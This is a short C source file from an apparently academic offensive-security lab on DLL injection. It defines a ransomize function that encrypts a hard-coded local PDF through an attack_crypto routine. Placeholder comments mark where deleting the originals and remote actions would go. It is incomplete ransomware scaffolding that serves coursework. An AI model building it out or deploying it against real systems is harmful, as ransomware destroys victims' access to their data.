#include "attack.h"
#include "attack_crypto.h"
#include <stdio.h>


int ransomize(void)
{
    /* Target files */

    /* Generate key, encrypt files and key */
    attack_crypto("C:/Users/20231367/OneDrive - TU Eindhoven/Documents/Y3Q2/2IC80 Lab on Offensive Security/dll_injection/build/important.pdf", "C:/Users/20231367/OneDrive - TU Eindhoven/Documents/Y3Q2/2IC80 Lab on Offensive Security/dll_injection/build/important.enc");
    
    crypto_cleanup();

    /* Delete original files */
    
    /* Handle remote actions */

    /* Cleanup */

    return 1;
}
